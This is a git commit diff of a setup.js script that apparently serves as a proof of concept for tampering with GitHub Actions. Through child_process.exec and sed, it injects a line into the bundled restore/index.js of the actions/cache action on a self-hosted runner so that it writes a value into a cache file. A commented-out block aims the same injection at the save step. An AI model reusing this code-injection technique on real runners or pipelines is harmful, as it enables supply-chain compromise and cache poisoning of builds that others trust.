98d1b6fdf08a0918427cde6b3874f99e2f2851c7
musset0 <musset025@gmail.com>
2023-09-04 13:09:20 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -16,9 +16,9 @@ console.log("this is a setup.....")
 // });
 
 
-let writecontent = 'const fs = __importStar(__webpack_require__(747));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
+let writecontent = 'fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
 
-cl_process.exec(`sed -i '47717i ${writecontent}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+cl_process.exec(`sed -i '8981i ${writecontent}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
@@ -28,6 +28,14 @@ cl_process.exec(`sed -i '47717i ${writecontent}'  /home/musset/Documents/actions
 });
 
 
+// cl_process.exec(`sed -i '47717i ${writecontent}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+//     if (err){
+//         console.log(err);
+//         return;
+//     }
+//     console.log(`stdout: ${stdout.toString()}`);
+//     console.log(`stderr: ${stderr}`);
+// });
 
 
 
